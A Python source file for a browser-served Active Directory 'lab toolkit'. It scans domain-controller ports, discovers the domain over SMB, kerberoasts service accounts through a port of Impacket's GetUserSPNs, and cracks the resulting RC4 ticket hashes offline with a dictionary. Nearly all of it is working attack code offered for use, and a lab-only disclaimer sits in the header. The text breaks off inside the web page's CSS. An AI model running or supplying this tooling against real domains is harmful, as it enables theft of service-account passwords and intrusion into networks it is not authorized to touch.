#!/usr/bin/env python3
# -*- coding: utf-8 -*-
#
# kerberoast_lab.py  --  Single-file AD Kerberos LAB toolkit.
# ===========================================================================
# One Python file, three tabs, served in the browser:
#
#   1. Recon        IP -> Domain     (read-only SMB/LDAP discovery)
#   2. Kerberoast   Domain -> SPN    (Impacket GetUserSPNs, crackable hashes)
#   3. Attack chain the full IP->Golden-Ticket kill chain as a lab reference,
#                   every offensive hop paired with how it's detected/defended.
#
#   Install:  pip install flask impacket
#   Run:      python kerberoast_lab.py            # -> http://127.0.0.1:5000
#             python kerberoast_lab.py --port 8000
#
#   >> LAB ONLY. These are dual-use, heavily-logged techniques. Run them only
#      against a lab you own (GOAD, a home AD) or an authorized engagement.
#      The tool EXECUTES recon + kerberoasting only; DCSync and Golden-Ticket
#      forging are documented in the Attack-chain tab as reference, not wired
#      up as push-button automation. Keep the server bound to 127.0.0.1.
#
#   Engine ported from Impacket's GetUserSPNs.py (Fortra / SecureAuth), used
#   under Impacket's license. Only the I/O boundary changed (stdout -> JSON).

from __future__ import division
from __future__ import print_function

import os
import re
import html
import uuid
import socket
import logging
import argparse
import threading
import concurrent.futures
from datetime import datetime
from binascii import hexlify, unhexlify

from flask import Flask, request, jsonify, Response, abort

# --- Impacket + pyasn1 imported defensively so the UI still boots to explain
#     itself if the engine isn't installed. ---
try:
    from pyasn1.codec.der import decoder
    from impacket.dcerpc.v5.samr import (
        UF_ACCOUNTDISABLE,
        UF_TRUSTED_FOR_DELEGATION,
        UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION,
    )
    from impacket.krb5 import constants
    from impacket.krb5.asn1 import TGS_REP, AS_REP
    from impacket.krb5.ccache import CCache
    from impacket.krb5.kerberosv5 import getKerberosTGT, getKerberosTGS
    from impacket.krb5.types import Principal
    from impacket.ldap import ldap, ldapasn1
    from impacket.ntlm import compute_lmhash, compute_nthash
    from impacket.examples.utils import ldap_login
    from impacket.smbconnection import SMBConnection
    from impacket.krb5.crypto import _enctype_table as _KRB_ETYPES, Key as _KrbKey, InvalidChecksum as _KrbInvalidChecksum

    try:
        from impacket.krb5.kerberosv5 import RC4_PREFERRED_TGS_ENCTYPES
    except ImportError:
        RC4_PREFERRED_TGS_ENCTYPES = (
            int(constants.EncryptionTypes.rc4_hmac.value),
            int(constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value),
            int(constants.EncryptionTypes.des3_cbc_sha1_kd.value),
            int(constants.EncryptionTypes.des_cbc_md5.value),
        )
    IMPACKET_OK = True
    IMPORT_ERROR = None
except Exception as _e:  # noqa: BLE001
    IMPACKET_OK = False
    IMPORT_ERROR = str(_e)


# ---------------------------------------------------------------------------
#  Friendly decoding of AD LDAP-bind / Kerberos error sub-codes.
#  AD packs the real reason into "... data <code> ..." on an invalidCredentials
#  (8009030C) bind, and into KDC_ERR_* strings on Kerberos failures.
# ---------------------------------------------------------------------------
_AD_DATA_CODES = {
    "525": "the user does not exist",
    "52e": "invalid credentials - wrong username or password",
    "52f": "account restriction (e.g. a blank password where one is required)",
    "530": "not permitted to log on at this time",
    "531": "not permitted to log on at this workstation",
    "532": "the password has expired",
    "533": "the account is disabled",
    "568": "too many context IDs",
    "701": "the account has expired",
    "773": "the user must reset their password before logging on",
    "775": "the account is locked out",
}
_KRB_CODES = {
    "KDC_ERR_PREAUTH_FAILED": "wrong password / key (pre-auth failed)",
    "KDC_ERR_C_PRINCIPAL_UNKNOWN": "the user/principal does not exist",
    "KDC_ERR_S_PRINCIPAL_UNKNOWN": "the requested SPN/service does not exist",
    "KDC_ERR_KEY_EXPIRED": "the password has expired",
    "KRB_AP_ERR_SKEW": "clock skew too great - sync this host's time with the DC",
    "KDC_ERR_ETYPE_NOSUPP": "no supported Kerberos encryption type",
    "KDC_ERR_WRONG_REALM": "wrong realm/domain for this principal",
    "KDC_ERR_PREAUTH_REQUIRED": "pre-authentication is required for this account",
}
_REMEDIATION = {
    "52e": "Use the FQDN domain (e.g. lab.local, not LAB), and double-check the username and password "
           "for typos / caps-lock. AD returns this same code for a wrong password AND a missing user.",
    "525": "Confirm the sAMAccountName and the domain are correct.",
    "532": "The password is expired - reset it, or use -k with a fresh ticket.",
    "533": "Enable the account or use a different one.",
    "775": "The account is locked out - wait for the lockout window or unlock it.",
    "KRB_AP_ERR_SKEW": "Sync your clock to the DC (ntpdate / w32tm); Kerberos allows only ~5 minutes of skew.",
}


def _decode_ad_hint(text):
    """Turn an AD 'data 52e' / KDC_ERR_* message into a plain-English hint."""
    if not text:
        return None
    parts = []
    key = None
    m = re.search(r"data\s+([0-9a-fA-F]{3,4})", text)
    if m:
        code = m.group(1).lower()
        desc = _AD_DATA_CODES.get(code)
        if desc:
            parts.append("LDAP bind failed (data %s): %s." % (code, desc))
            key = code
    for k, v in _KRB_CODES.items():
        if k in text:
            parts.append("Kerberos error %s: %s." % (k, v))
            key = key or k
            break
    if not parts:
        return None
    rem = _REMEDIATION.get(key)
    if rem:
        parts.append(rem)
    return " ".join(parts)


# ===========================================================================
#  STAGE 1 ENGINE  --  Recon: IP -> Domain + AD port sweep (read-only)
# ===========================================================================

# Standard Active Directory / domain-controller service ports.
AD_PORTS = [
    (53,   "DNS"),
    (88,   "Kerberos"),
    (135,  "RPC endpoint mapper"),
    (139,  "NetBIOS-SSN"),
    (389,  "LDAP"),
    (445,  "SMB"),
    (464,  "kpasswd"),
    (636,  "LDAPS"),
    (3268, "Global Catalog"),
    (3269, "Global Catalog (TLS)"),
    (3389, "RDP"),
    (5985, "WinRM-HTTP"),
    (5986, "WinRM-HTTPS"),
    (9389, "AD Web Services"),
]


def _check_port(ip, port, timeout=1.2):
    """Read-only TCP connect check (like `nmap -p`). Returns True if open."""
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.settimeout(timeout)
    try:
        return s.connect_ex((ip, port)) == 0
    except Exception:
        return False
    finally:
        try:
            s.close()
        except Exception:
            pass


def scan_ports(ip, timeout=1.2):
    """Concurrently probe every standard AD port on `ip`."""
    open_map = {}
    with concurrent.futures.ThreadPoolExecutor(max_workers=16) as ex:
        futs = {ex.submit(_check_port, ip, p, timeout): p for p, _svc in AD_PORTS}
        for fut in concurrent.futures.as_completed(futs):
            open_map[futs[fut]] = bool(fut.result())
    return [{"port": p, "service": svc, "open": open_map.get(p, False)} for p, svc in AD_PORTS]


def recon_from_ip(ip):
    """Discover the AD domain from a DC's IP via SMB negotiation (the same
    trick nxc/CrackMapExec uses). Read-only: no credentials, no writes."""
    smb = SMBConnection(ip, ip, timeout=7)
    try:
        # A null session populates a few more fields on some DCs; ignore failure.
        try:
            smb.login('', '')
        except Exception as e:
            logging.debug('null session: %s' % str(e))
        domain = smb.getServerDNSDomainName() or ''
        host = smb.getServerDNSHostName() or ''
        nb_domain = smb.getServerDomain() or ''
        nb_name = smb.getServerName() or ''
        os_str = smb.getServerOS() or ''
    finally:
        try:
            smb.close()
        except Exception:
            pass

    base_dn = ','.join('DC=%s' % p for p in domain.split('.')) if domain else ''
    return {
        "ip": ip,
        "domain": domain,
        "base_dn": base_dn,
        "dc_host": host,
        "netbios_domain": nb_domain,
        "netbios_name": nb_name,
        "os": os_str,
    }


def run_recon(ip):
    """Wrapper: AD port sweep + SMB domain discovery. Returns {ok, data, log,
    error}. Never raises."""
    handler = _ListLogHandler()
    handler.setFormatter(logging.Formatter('%(message)s'))
    root = logging.getLogger()
    root.addHandler(handler)
    out = {"ok": False, "data": None, "log": [], "error": None}
    try:
        data = {"ip": ip, "domain": "", "base_dn": "", "dc_host": "",
                "netbios_domain": "", "netbios_name": "", "os": "", "ports": []}

        # AD port sweep (pure sockets - works with or without impacket).
        data["ports"] = scan_ports(ip)
        port_open = {p["port"]: p["open"] for p in data["ports"]}
        n_open = sum(1 for p in data["ports"] if p["open"])
        logging.info("Port sweep: %d/%d AD ports open on %s" % (n_open, len(data["ports"]), ip))

        # SMB domain discovery only if impacket is present and 445 is open.
        if IMPACKET_OK and port_open.get(445):
            try:
                info = recon_from_ip(ip)
                for k in ("domain", "base_dn", "dc_host", "netbios_domain", "netbios_name", "os"):
                    if info.get(k):
                        data[k] = info[k]
                if data["domain"]:
                    logging.info("Domain discovered: %s" % data["domain"])
            except Exception as e:
                logging.warning("SMB discovery failed: %s" % str(e))
        elif not IMPACKET_OK:
            logging.warning("impacket unavailable - port sweep only, no domain discovery.")
        elif not port_open.get(445):
            logging.info("SMB (445) closed/filtered - skipping domain discovery.")

        out["data"] = data
        out["ok"] = bool(data["domain"] or data["netbios_domain"] or n_open > 0)
        if not out["ok"]:
            out["error"] = "No AD ports open and no domain returned - is %s reachable / a DC?" % ip
    except Exception as e:
        logging.debug("recon exception", exc_info=True)
        out["error"] = str(e) or e.__class__.__name__
    finally:
        out["log"] = handler.records
        root.removeHandler(handler)
    _blob = " ".join([out.get("error") or ""] + [r.get("message", "") for r in out["log"]])
    out["hint"] = _decode_ad_hint(_blob)
    return out


# ===========================================================================
#  STAGE 2 ENGINE  --  Kerberoast: GetUserSPNs ported to return data
# ===========================================================================

class Options(object):
    """Stand-in for the argparse namespace GetUserSPNs.py used."""

    def __init__(self, **kwargs):
        self.no_preauth = None
        self.outputfile = None
        self.no_rc4 = False
        self.usersfile = None
        self.aesKey = None
        self.k = False
        self.request = False
        self.dc_ip = None
        self.dc_host = None
        self.save = False
        self.request_user = None
        self.stealth = False
        self.machine_only = False
        self.request_machine = None
        self.hashes = None
        self.no_pass = False
        self.save_dir = "."
        for k, v in kwargs.items():
            setattr(self, k, v)


class GetUserSPNs(object):
    """Kerberoasting engine. Results collect in self.results / self.hashes /
    self.saved_tickets instead of printing."""

    def __init__(self, username, password, user_domain, target_domain, cmdLineOptions):
        self.__username = username
        self.__password = password
        self.__domain = user_domain
        self.__target = None
        self.__targetDomain = target_domain
        self.__lmhash = ''
        self.__nthash = ''
        self.__no_preauth = cmdLineOptions.no_preauth
        self.__outputFileName = cmdLineOptions.outputfile
        self.__noRC4 = cmdLineOptions.no_rc4
        self.__usersFile = cmdLineOptions.usersfile
        self.__aesKey = cmdLineOptions.aesKey
        self.__doKerberos = cmdLineOptions.k
        self.__requestTGS = cmdLineOptions.request
        self.__kdcIP = cmdLineOptions.dc_ip
        self.__kdcHost = cmdLineOptions.dc_host
        self.__saveTGS = cmdLineOptions.save
        self.__saveDir = getattr(cmdLineOptions, 'save_dir', '.')
        self.__requestUser = cmdLineOptions.request_user
        self.__stealth = cmdLineOptions.stealth
        self.__machineOnly = cmdLineOptions.machine_only
        self.__requestMachine = cmdLineOptions.request_machine

        self.results = []
        self.hashes = []
        self.saved_tickets = []

        if cmdLineOptions.hashes is not None:
            self.__lmhash, self.__nthash = cmdLineOptions.hashes.split(':')

        domainParts = self.__targetDomain.split('.')
        self.baseDN = ''
        for i in domainParts:
            self.baseDN += 'dc=%s,' % i
        self.baseDN = self.baseDN[:-1]

        if user_domain != self.__targetDomain and (self.__kdcIP or self.__kdcHost):
            logging.warning('KDC IP address and hostname will be ignored because of cross-domain targeting.')
            self.__kdcIP = None
            self.__kdcHost = None

    @staticmethod
    def getUnixTime(t):
        t -= 116444736000000000
        t /= 10000000
        return t

    def getTGT(self):
        domain, _, TGT, _ = CCache.parseFile(self.__domain)
        if TGT is not None:
            return TGT

        userName = Principal(self.__username, type=constants.PrincipalNameType.NT_PRINCIPAL.value)

        if self.__password != '' and (self.__lmhash == '' and self.__nthash == '') and not self.__noRC4:
            try:
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName, '', self.__domain,
                    compute_lmhash(self.__password),
                    compute_nthash(self.__password), self.__aesKey,
                    kdcHost=self.__kdcIP)
            except Exception as e:
                logging.debug('TGT: %s' % str(e))
                tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                    userName, self.__password, self.__domain,
                    unhexlify(self.__lmhash),
                    unhexlify(self.__nthash), self.__aesKey,
                    kdcHost=self.__kdcIP)
        else:
            tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                userName, self.__password, self.__domain,
                unhexlify(self.__lmhash),
                unhexlify(self.__nthash), self.__aesKey,
                kdcHost=self.__kdcIP)

        return {'KDC_REP': tgt, 'cipher': cipher, 'sessionKey': sessionKey}

    def outputTGS(self, ticket, oldSessionKey, sessionKey, username, spn):
        if self.__no_preauth:
            decodedTGS = decoder.decode(ticket, asn1Spec=AS_REP())[0]
        else:
            decodedTGS = decoder.decode(ticket, asn1Spec=TGS_REP())[0]

        etype = decodedTGS['ticket']['enc-part']['etype']
        entry = None

        if etype == constants.EncryptionTypes.rc4_hmac.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.rc4_hmac.value, username,
                decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        elif etype == constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes128_cts_hmac_sha1_96.value, username,
                decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
        elif etype == constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value:
            entry = '$krb5tgs$%d$%s$%s$*%s*$%s$%s' % (
                constants.EncryptionTypes.aes256_cts_hmac_sha1_96.value, username,
                decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][-12:].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:-12:].asOctets()).decode())
        elif etype == constants.EncryptionTypes.des_cbc_md5.value:
            entry = '$krb5tgs$%d$*%s$%s$%s*$%s$%s' % (
                constants.EncryptionTypes.des_cbc_md5.value, username,
                decodedTGS['ticket']['realm'], spn.replace(':', '~'),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][:16].asOctets()).decode(),
                hexlify(decodedTGS['ticket']['enc-part']['cipher'][16:].asOctets()).decode())
        else:
            logging.error('Skipping %s/%s due to incompatible e-type %d' % (
                decodedTGS['ticket']['sname']['name-string'][0],
                decodedTGS['ticket']['sname']['name-string'][1], etype))

        if entry is not None:
            self.hashes.append(entry)

        if self.__saveTGS is True:
            ccache = CCache()
            try:
                ccache.fromTGS(ticket, oldSessionKey, sessionKey)
                path = os.path.join(self.__saveDir, '%s.ccache' % username)
                ccache.saveFile(path)
                self.saved_tickets.append(path)
            except Exception as e:
                logging.error(str(e))

    def run(self):
        if self.__usersFile:
            self.request_users_file_TGSs()
            return

        ldapConnection = ldap_login(
            self.__target, self.baseDN, self.__kdcIP, self.__kdcHost,
            self.__doKerberos, self.__username, self.__password, self.__domain,
            self.__lmhash, self.__nthash, self.__aesKey,
            target_domain=self.__targetDomain, fqdn=True)
        self.__target = ldapConnection._dstHost

        filter_spn = "servicePrincipalName=*"
        filter_person = "objectCategory=person"
        filter_computer = "objectCategory=computer"
        filter_not_disabled = "!(userAccountControl:1.2.840.113556.1.4.803:=2)"

        if self.__machineOnly is True:
            searchFilter = "(&"
            searchFilter += "(" + filter_computer + ")"
            searchFilter += "(" + filter_not_disabled + ")"
            if self.__requestMachine is not None:
                searchFilter += '(sAMAccountName:=%s)' % (self.__requestMachine)
        else:
            searchFilter = "(&"
            searchFilter += "(" + filter_person + ")"
            searchFilter += "(" + filter_not_disabled + ")"
            if self.__requestUser is not None:
                searchFilter += '(sAMAccountName:=%s)' % self.__requestUser

        if self.__stealth is True:
            logging.warning('Stealth option may cause huge memory consumption / errors on very large domains.')
        else:
            searchFilter += "(" + filter_spn + ")"
        searchFilter += ')'

        try:
            paged_search_control = ldapasn1.SimplePagedResultsControl(criticality=True, size=1000)
            resp = ldapConnection.search(
                searchFilter=searchFilter,
                attributes=['servicePrincipalName', 'sAMAccountName', 'pwdLastSet',
                            'MemberOf', 'userAccountControl', 'lastLogon'],
                searchControls=[paged_search_control])
        except ldap.LDAPSearchError as e:
            if e.getErrorString().find('sizeLimitExceeded') >= 0:
                resp = e.getAnswers()
            else:
                raise

        answers = []
        logging.debug('Total of records returned %d' % len(resp))
        for item in resp:
            if isinstance(item, ldapasn1.SearchResultEntry) is not True:
                continue
            mustCommit = False
            sAMAccountName = ''
            memberOf = ''
            SPNs = []
            pwdLastSet = ''
            userAccountControl = 0
            lastLogon = 'N/A'
            delegation = ''
            try:
                for attribute in item['attributes']:
                    if str(attribute['type']) == 'sAMAccountName':
                        sAMAccountName = str(attribute['vals'][0])
                        mustCommit = True
                    elif str(attribute['type']) == 'userAccountControl':
                        userAccountControl = str(attribute['vals'][0])
                        if int(userAccountControl) & UF_TRUSTED_FOR_DELEGATION:
                            delegation = 'unconstrained'
                        elif int(userAccountControl) & UF_TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION:
                            delegation = 'constrained'
                    elif str(attribute['type']) == 'memberOf':
                        memberOf = str(attribute['vals'][0])
                    elif str(attribute['type']) == 'pwdLastSet':
                        if str(attribute['vals'][0]) == '0':
                            pwdLastSet = '<never>'
                        else:
                            pwdLastSet = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'lastLogon':
                        if str(attribute['vals'][0]) == '0':
                            lastLogon = '<never>'
                        else:
                            lastLogon = str(datetime.fromtimestamp(self.getUnixTime(int(str(attribute['vals'][0])))))
                    elif str(attribute['type']) == 'servicePrincipalName':
                        for spn in attribute['vals']:
                            SPNs.append(spn.asOctets().decode('utf-8'))

                if mustCommit is True:
                    if int(userAccountControl) & UF_ACCOUNTDISABLE:
                        logging.debug('Bypassing disabled account %s ' % sAMAccountName)
                    else:
                        for spn in SPNs:
                            answers.append([spn, sAMAccountName, memberOf, pwdLastSet, lastLogon, delegation])
            except Exception as e:
                logging.error('Skipping item, cannot process due to error %s' % str(e))

        for row in answers:
            self.results.append(dict(zip(
                ["spn", "sAMAccountName", "memberOf", "pwdLastSet", "lastLogon", "delegation"], row)))

        if len(answers) > 0 and (self.__requestTGS is True or self.__requestUser is not None
                                 or self.__requestMachine is not None):
            users = dict((vals[1], vals[0]) for vals in answers)
            TGT = self.getTGT()
            for user, SPN in users.items():
                sAMAccountName = user
                downLevelLogonName = self.__targetDomain + "\\" + sAMAccountName
                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_MS_PRINCIPAL.value
                    principalName.components = [downLevelLogonName]
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                        principalName, self.__domain, self.__kdcIP,
                        TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'],
                        etypes=RC4_PREFERRED_TGS_ENCTYPES)
                    self.outputTGS(tgs, oldSessionKey, sessionKey, sAMAccountName,
                                   self.__targetDomain + "/" + sAMAccountName)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (downLevelLogonName, str(e)))

    def request_users_file_TGSs(self):
        if isinstance(self.__usersFile, (list, tuple)):
            usernames = [u.strip() for u in self.__usersFile if u.strip()]
        else:
            with open(self.__usersFile) as fi:
                usernames = [line.strip() for line in fi if line.strip()]
        self.request_multiple_TGSs(usernames)

    def request_multiple_TGSs(self, usernames):
        if self.__no_preauth:
            for username in usernames:
                try:
                    no_preauth_principal = Principal(
                        self.__no_preauth, type=constants.PrincipalNameType.NT_PRINCIPAL.value)
                    tgt, cipher, oldSessionKey, sessionKey = getKerberosTGT(
                        clientName=no_preauth_principal, password=self.__password,
                        domain=self.__domain, lmhash=(self.__lmhash), nthash=(self.__nthash),
                        aesKey=self.__aesKey, kdcHost=self.__kdcHost,
                        serverName=username, kerberoast_no_preauth=True)
                    self.outputTGS(tgt, oldSessionKey, sessionKey, username, username)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))
        else:
            TGT = self.getTGT()
            for username in usernames:
                try:
                    principalName = Principal()
                    principalName.type = constants.PrincipalNameType.NT_ENTERPRISE.value
                    principalName.components = [username]
                    tgs, cipher, oldSessionKey, sessionKey = getKerberosTGS(
                        principalName, self.__domain, self.__kdcIP,
                        TGT['KDC_REP'], TGT['cipher'], TGT['sessionKey'],
                        etypes=RC4_PREFERRED_TGS_ENCTYPES)
                    self.outputTGS(tgs, oldSessionKey, sessionKey, username, username)
                except Exception as e:
                    logging.debug("Exception:", exc_info=True)
                    logging.error('Principal: %s - %s' % (username, str(e)))


class _ListLogHandler(logging.Handler):
    def __init__(self):
        super(_ListLogHandler, self).__init__()
        self.records = []

    def emit(self, record):
        try:
            self.records.append({"level": record.levelname, "message": self.format(record)})
        except Exception:
            pass


def run_kerberoast(params):
    payload = {"ok": False, "results": [], "hashes": [], "saved_tickets": [],
               "log": [], "error": None}
    if not IMPACKET_OK:
        payload["error"] = "impacket is not available: %s" % IMPORT_ERROR
        return payload

    handler = _ListLogHandler()
    handler.setFormatter(logging.Formatter('%(message)s'))
    root = logging.getLogger()
    prev_level = root.level
    if params.get("debug"):
        root.setLevel(logging.DEBUG)
    elif root.level > logging.INFO or root.level == logging.NOTSET:
        root.setLevel(logging.INFO)
    root.addHandler(handler)

    try:
        user_domain = params["user_domain"]
        target_domain = params.get("target_domain") or user_domain
        opts = Options(
            no_preauth=params.get("no_preauth") or None,
            no_rc4=bool(params.get("no_rc4")),
            aesKey=params.get("aes_key") or None,
            k=bool(params.get("kerberos")),
            request=bool(params.get("request")),
            dc_ip=params.get("dc_ip") or None,
            dc_host=params.get("dc_host") or None,
            save=bool(params.get("save")),
            save_dir=params.get("save_dir") or ".",
            request_user=params.get("request_user") or None,
            stealth=bool(params.get("stealth")),
            machine_only=bool(params.get("machine_only")),
            request_machine=params.get("request_machine") or None,
            hashes=params.get("hashes") or None,
            no_pass=bool(params.get("no_pass")),
            usersfile=params.get("users_list") or None,
        )
        if opts.save:
            opts.request = True
        if opts.request_machine is not None:
            opts.machine_only = True

        engine = GetUserSPNs(params.get("username", ""), params.get("password", ""),
                             user_domain, target_domain, opts)
        engine.run()
        payload["results"] = engine.results
        payload["hashes"] = engine.hashes
        payload["saved_tickets"] = engine.saved_tickets
        payload["ok"] = True
    except Exception as e:
        logging.debug("Fatal exception", exc_info=True)
        payload["error"] = str(e) or e.__class__.__name__
    finally:
        payload["log"] = handler.records
        root.removeHandler(handler)
        root.setLevel(prev_level)
    _blob = " ".join([payload.get("error") or ""] + [r.get("message", "") for r in payload["log"]])
    payload["hint"] = _decode_ad_hint(_blob)
    return payload


# ===========================================================================
#  STAGE 2b ENGINE  --  Offline dictionary crack of roasted hashes (by user)
#
#  Pure-Python RC4-HMAC (etype 23) cracker: for each candidate password we
#  derive the NT hash and try to decrypt the service ticket; a valid checksum
#  means the password matched. This ONLY recovers weak service-account
#  passwords - which is exactly the weakness Kerberoasting demonstrates.
#  AES tickets (17/18) need a per-principal salt; export them and use hashcat.
# ===========================================================================

_KRB5TGS_RE = re.compile(r"^\$krb5tgs\$(\d+)\$(.*)\$([0-9a-fA-F]+)\$([0-9a-fA-F]+)\s*$", re.S)


def _parse_krb5tgs(h):
    """Pull (etype, username, ciphertext) out of a $krb5tgs$ string."""
    m = _KRB5TGS_RE.match(h.strip())
    if not m:
        return None
    etype = int(m.group(1))
    middle, chk, edata = m.group(2), m.group(3), m.group(4)
    user = middle.lstrip('*').split('$', 1)[0]
    try:
        if etype == 23:               # RC4: checksum || edata
            ct = unhexlify(chk) + unhexlify(edata)
        else:                          # AES: edata || checksum
            ct = unhexlify(edata) + unhexlify(chk)
    except Exception:
        return None
    return {"etype": etype, "user": user, "ct": ct}


def _iter_wordlist(text, path, cap):
    """Yield candidate passwords from pasted text then an optional file path."""
    n = 0
    if text:
        for line in text.replace('\r', '').split('\n'):
            w = line.strip()
            if w:
                yield w
                n += 1
                if cap and n >= cap:
                    return
    if path:
        try:
            with open(path, 'r', encoding='utf-8', errors='ignore') as fh:
                for line in fh:
                    w = line.rstrip('\r\n')
                    if w:
                        yield w
                        n += 1
                        if cap and n >= cap:
                            logging.warning("wordlist capped at %d words" % cap)
                            return
        except Exception as e:
            logging.error("wordlist path: %s" % str(e))


def _crack_worker(job_id, hashes, wordlist_text, wordlist_path, cap):
    handler = _ListLogHandler()
    handler.setFormatter(logging.Formatter('%(message)s'))
    root = logging.getLogger()
    root.addHandler(handler)

    targets = []
    for h in hashes:
        p = _parse_krb5tgs(h)
        if p:
            p["found"] = False
            p["password"] = None
            targets.append(p)
    rc4 = [t for t in targets if t["etype"] == 23]
    unsupported = sorted({t["user"] for t in targets if t["etype"] != 23})

    result = {"ok": True, "cracked": [], "unsupported": unsupported,
              "tried": 0, "total": len(targets), "rc4": len(rc4), "log": [], "error": None}
    try:
        if not IMPACKET_OK:
            raise RuntimeError("impacket is not available: %s" % IMPORT_ERROR)
        cipher = _KRB_ETYPES[23]
        tried = 0
        for w in _iter_wordlist(wordlist_text, wordlist_path, cap):
            key = _KrbKey(23, compute_nthash(w))
            remaining = False
            for t in rc4:
                if t["found"]:
                    continue
                remaining = True
                try:
                    cipher.decrypt(key, 2, t["ct"])
                    t["found"] = True
                    t["password"] = w
                    logging.info("cracked %s : %s" % (t["user"], w))
                except _KrbInvalidChecksum:
                    pass
                except Exception:
                    pass
            tried += 1
            if tried % 500 == 0:
                with _JOBS_LOCK:
                    j = _JOBS.get(job_id)
                    if j:
                        j["progress"] = {"tried": tried, "found": sum(1 for t in rc4 if t["found"])}
            if not remaining and rc4:
                break
        result["tried"] = tried
        result["cracked"] = [{"user": t["user"], "password": t["password"]} for t in rc4 if t["found"]]
    except Exception as e:
        logging.debug("crack exception", exc_info=True)
        result["ok"] = False
        result["error"] = str(e) or e.__class__.__name__
    finally:
        result["log"] = handler.records
        root.removeHandler(handler)

    with _JOBS_LOCK:
        j = _JOBS.get(job_id)
        if j:
            j["state"] = "done" if result["ok"] else "error"
            j["result"] = result
            j["progress"] = {"tried": result["tried"], "found": len(result["cracked"])}


# ===========================================================================
#  FRONT-END  (served without Jinja; only the import banner is substituted)
# ===========================================================================

PAGE_HTML = r"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>Kerberos Kill Chain - Lab Toolkit</title>
<link rel="preconnect" href="https://fonts.googleapis.com">
<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Archivo:wght@600;700;800&family=IBM+Plex+Mono:wght@400;500;600&family=IBM+Plex+Sans:wght@400;500;600&display=swap">
<style>
  :root{
    --bg:#0d1117; --surface:#161c24; --surface-2:#1d2530; --inset:#12171f;
    --line:#28313d; --line-2:#333e4c;
    --ink:#e9eef5; --muted:#98a5b4; --faint:#6d7986;
    --gold:#f0c559; --gold-dim:#c79a34; --gold-bg:rgba(240,197,89,.10); --gold-line:rgba(240,197,89,.4);
    --red:#f0655c; --red-bg:rgba(240,101,92,.11); --red-line:rgba(240,101,92,.4);
    --teal:#33cbb8; --teal-bg:rgba(51,203,184,.10); --teal-line:rgba(51,203,184,.38);
    --mono:'IBM Plex Mono',ui-monospace,'SFMono-Regular',Menlo,Consolas,monospace;
    --sans:'IBM Plex Sans',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
    --disp:'Archivo',var(--sans);
  }
  *{box-sizing:border-box}
  body{margin:0;background:var(--bg);color:var(--ink);font-family:var(--sans);
       font-size:14px;line-height:1.55;-webkit-font-smoothing:antialiased}
  a{color:var(--gold)}
  .wrap{max-width:1160px;margin:0 auto;padding:24px 22px 64px}

  header.top{display:flex;align-items:center;gap:14px;flex-wrap:wrap}
  .logo{width:40px;height:40px;border-radius:10px;flex:0 0 auto;font-size:21px;
        background:linear-gradient(150deg,#3a2f12,#191008);border:1px solid var(--gold-line);
        display:flex;align-items:center;justify-content:center}
  .eyebrow{font-family:var(--mono);font-size:10.5px;letter-spacing:.2em;text-transform:uppercase;color:var(--gold-dim);margin:0 0 3px}
  h1{font-family:var(--disp);font-weight:800;font-size:22px;margin:0;letter-spacing:-.01em}
  .sub{color:var(--muted);font-size:12.5px}

  .scope{display:flex;align-items:center;gap:11px;margin:18px 0 4px;padding:10px 15px;
         background:var(--red-bg);border:1px solid var(--red-line);border-radius:10px;font-size:12.5px}
  .scope .k{font-family:var(--mono);font-size:10.5px;font-weight:600;letter-spacing:.12em;
            text-transform:uppercase;color:var(--red);white-space:nowrap}
  .scope span{color:var(--muted)}
  .scope b{color:var(--ink)}
  .banner.err{margin:16px 0 0;padding:10px 14px;border-radius:9px;font-size:12.5px;
              background:var(--red-bg);border:1px solid var(--red-line);color:#ffc4c0}

  /* tabs */
  .tabs{display:flex;gap:4px;margin:22px 0 20px;border-bottom:1px solid var(--line)}
  .tab{font-family:var(--sans);font-size:13.5px;font-weight:500;color:var(--muted);
       background:transparent;border:0;border-bottom:2px solid transparent;
       padding:11px 16px;cursor:pointer;display:flex;align-items:center;gap:8px;margin-bottom:-1px}
  .tab:hover{color:var(--ink)}
  .tab.active{color:var(--ink);border-bottom-color:var(--gold)}
  .tab .n{font-family:var(--mono);font-size:11px;color:var(--gold-dim)}
  .tab.active .n{color:var(--gold)}
  .panel{display:none} .panel.active{display:block}

  .card{background:var(--surface);border:1px solid var(--line);border-radius:12px;overflow:hidden}
  .card > h2{font-size:11.5px;text-transform:uppercase;letter-spacing:.9px;color:var(--muted);
